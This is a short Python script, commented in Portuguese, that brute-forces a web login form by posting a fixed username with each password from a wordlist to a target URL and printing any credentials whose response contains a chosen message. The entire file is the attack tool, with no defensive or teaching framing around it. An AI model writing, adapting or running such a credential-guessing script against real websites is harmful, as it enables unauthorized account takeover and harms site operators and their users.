import requests
import sys

argv = sys.argv #argv1 url, argv2 name_log, argv3 name_pass, argv4 usuario, argv5 lista de senhas, argv[6] mensagem de erro ou de acesso

url = str(argv[1]) #url

usuario = str(argv[4]) #lista de usuarios
senha = str(argv[5]) #lista de senhas

name_log = str(argv[2]) #name usuario
name_pass = str(argv[3]) #name senha


wordlist = open(senha, "r") #abre a lista de senhas

msg = argv[6] #Mensagem de erro ou de login

for i in wordlist: #Dentro de wordlist procure por i que é a senha
    ck = {name_log: usuario, name_pass: i} #Data passando usuario e senha
    r = requests.post(url, data= ck) #Faz a requisição para o site e ja leva o usuario e senha
    if msg in r.text: #Checa se deu certo ou não
        print("Found :", "Usuario", usuario, "||", "Senha", i)
        print("=========================================")
